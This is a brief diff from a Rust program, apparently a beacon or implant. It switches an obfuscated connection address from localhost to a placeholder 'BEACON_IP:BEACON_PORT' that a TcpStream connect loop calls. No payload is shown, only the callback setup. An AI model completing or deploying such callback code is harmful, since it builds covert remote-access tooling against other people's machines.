@@ -117,8 +117,8 @@ async fn main() {
         return;
     }
 
-    let addr = e!("127.0.0.1:8085");
-    // let addr = e!("BEACON_IP:BEACON_PORT");
+    //let addr = e!("127.0.0.1:8085");
+    let addr = e!("BEACON_IP:BEACON_PORT");
 
     loop {
         match TcpStream::connect(&addr).await {
